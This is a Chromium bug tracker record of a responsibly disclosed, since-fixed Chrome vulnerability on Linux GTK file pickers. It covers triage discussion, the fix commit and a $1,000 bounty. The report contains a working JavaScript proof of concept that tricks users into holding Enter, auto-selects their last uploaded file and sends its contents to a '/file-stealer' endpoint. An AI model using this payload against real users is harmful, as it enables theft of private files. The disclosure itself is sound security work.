# On Ubuntu (or other Linux-based systems) an attacker can steal files uploaded to other sites with little user interaction.

| Field | Value |
|-------|-------|
| **Issue ID** | [470928605](https://issues.chromium.org/issues/470928605) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | UI>Linux Toolkit Theming |
| **Platforms** | Linux, ChromeOS |
| **Reporter** | va...@hotmail.com |
| **Assignee** | th...@chromium.org |
| **Created** | 2025-12-22 |
| **Bounty** | $1,000.00 |

## Description

---

### Report description

On Ubuntu (or other Linux-based systems) an attacker can steal files uploaded to other sites with little user interaction.

---

### Bug location

#### Where do you want to report your vulnerability?

Chrome VRP – Report security issues affecting the Chrome browser. [See program rules](https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules)

#### Which URL (or repository) have you found the vulnerability in?

/

---

### The problem

#### Please describe the technical details of the vulnerability

I discovered that on Ubuntu, whenever you're uploading a file using a `<input type=file>`, the file selection window automatically opens the folder where from which the previous file upload across any site was made. Furthermore, it even selects the top file in that directory. I found that by tricking a victim into holding the Enter key on their keyboard, a malicious site could automatically select the previously uploaded file and send it to the attacker, without the user having a chance at stopping the attack.

The code below shows a simple PoC to reproduce the issue.

1. First, go to any website that supports a file upload (In the attached video PoC, this is the example on <https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/input/file#using_file_inputs>).
2. Upload a file from any directory on the filesystem. This mimics a user who has uploaded a file to any site.
3. Now browse to the attacker's page. If you hold the `Enter` key on this page, it will automatically open the file picker window. The `Enter` key being held means that within that window the top file will be selected and uploaded instantaneously.

```
<p>Hold the "Enter" key</p>
<input type="file" id="fileInput" style="display:none;">
<script>
document.addEventListener('keydown', async e => {
  if (e.key === 'Enter') {
    const fileInput = document.getElementById('fileInput');
    fileInput.click();
    fileInput.addEventListener('change', function() {
      const file = this.files[0];

      console.log('File name:', file.name);
      console.log('File size (bytes):', file.size);
      console.log('MIME type:', file.type);

      const reader = new FileReader();
      reader.onload = function(e) {
        console.log('File content:', e.target.result);
        fetch('/file-stealer?file=' + e.target.result);
      };
      reader.readAsText(file);
    });
  }
})
</script>

```

I believe that tricking a user into holding the `Enter` key is a trivial user interaction to achieve. The video PoC that I've attached shows a site that is dressed up a bit more and that requires the holding of this key to load, however one could also easily envision a game where the enter key is used to speed up a car, and thus held.

As a user, I'd like to know that I can safely hold any key on my keyboard without that causing my last uploaded file to be stolen.

#### Impact analysis

Any remote attacker can host a malicious site that allows the stealing of files uploaded to other sites.

---

### The cause

#### What version of Chrome have you found the security issue in?

143.0.7499.169

#### Is the security issue related to a crash?

No, it is not related to a crash.

#### Choose the type of vulnerability

Site Isolation Bypass

#### How would you like to be publicly acknowledged for your report?

Robbe Van Roey | PinkDraconian

## Attachments

- [chrome.mp4](attachments/chrome.mp4) (video/mp4, 7.4 MB)
- [test.html](attachments/test.html) (text/html, 2.5 KB)

## Timeline

### aj...@google.com (2025-12-23)

Adding a few folks with history in the gtk file picker to help with routing. It feels like the file selection dialog should start with an empty file, or be on the 'cancel' option - perhaps this is the norm and this particular linux configuration is a bit weird?

### va...@hotmail.com (2025-12-23)

> perhaps this is the norm and this particular linux configuration is a bit weird?

I tested this on a fresh Kali and Ubuntu install and it worked straight out of the box. I didn't go much further into it since I assume that Ubuntu is a pretty common one that attackers might want to target. Please do let me know if you run into any issues. Happy to help.

### ch...@google.com (2025-12-23)

Setting Priority to P2 to match Severity s3. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### fe...@chromium.org (2026-01-05)

<https://crbug.com/419035409> brought up the enter key attack previously, although this seems to be a slightly different variant.

Ideally we wouldn't open any dialogs at all while the enter key (or space key or maybe any non-modifier key?) were held down but starting focused on cancel and with no file selected seems good.

### th...@chromium.org (2026-01-05)

I tested with KDE and the PoC does not work since the KDE file dialog did not pre-select a file. I tried (but not very hard) and failed to switch to the GTK/Gnome file pickers.

### dx...@google.com (2026-01-06)

Project: chromium/src  

Branch:  main  

Author:  Tom Anderson [thomasanderson@chromium.org](mailto:thomasanderson@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7399531>

[GTK] Don't preselect file dialog accept buttons

---


Expand for full commit details
```
     
    R=thestig 
     
    Change-Id: I61cc29e0560af5dd433ea07c234b9813e3d72c74 
    Fixed: 470928605 
    Bug: 435684924 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7399531 
    Commit-Queue: Thomas Anderson <thomasanderson@chromium.org> 
    Reviewed-by: Lei Zhang <thestig@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1564733}

```

---

Files:

- M `ui/gtk/select_file_dialog_linux_gtk.cc`

---

Hash: [e93121e97478a41d529c8586a48b4ec34173f79a](https://chromiumdash.appspot.com/commit/e93121e97478a41d529c8586a48b4ec34173f79a)  

Date: Tue Jan 6 01:42:17 2026


---

### sp...@google.com (2026-01-09)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $1000.00 for this report.

Rationale for this decision:
low impact UI spoofing with user gestures


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-04-15)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> low impact UI spoofing with user gestures

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/470928605)*
